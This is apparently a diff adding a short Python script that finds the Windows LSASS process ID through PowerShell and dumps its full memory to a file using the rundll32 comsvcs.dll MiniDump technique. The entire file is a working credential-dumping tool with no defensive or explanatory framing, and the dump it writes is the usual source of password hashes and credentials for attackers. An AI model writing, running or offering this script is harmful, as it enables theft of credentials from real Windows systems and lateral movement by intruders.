@@ -1,0 +1,33 @@
+import subprocess
+
+# Step 1: Get the LSASS process ID
+def get_lsass_id():
+    command = "Get-Process lsass | Select-Object -ExpandProperty Id"
+    try:
+        result = subprocess.run(
+            ["powershell", "-Command", command],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        return result.stdout.strip()  # Return the process ID
+    except subprocess.CalledProcessError as e:
+        print(f"Error retrieving LSASS ID: {e.stderr}")
+        return None
+
+# Step 2: Create the memory dump
+def create_dump(process_id, dump_path):
+    command = f"rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump {process_id} {dump_path} full"
+    try:
+        subprocess.run(command, shell=True, check=True)
+        print(f"Memory dump created at: {dump_path}")
+    except subprocess.CalledProcessError as e:
+        print(f"Error creating dump: {e.stderr}")
+
+# Main execution
+lsass_id = get_lsass_id()
+if lsass_id and lsass_id.isdigit():
+    dump_path = "C:\\lsass.dmp"
+    create_dump(lsass_id, dump_path)
+else:
+    print("Failed to retrieve a valid LSASS Process ID.")
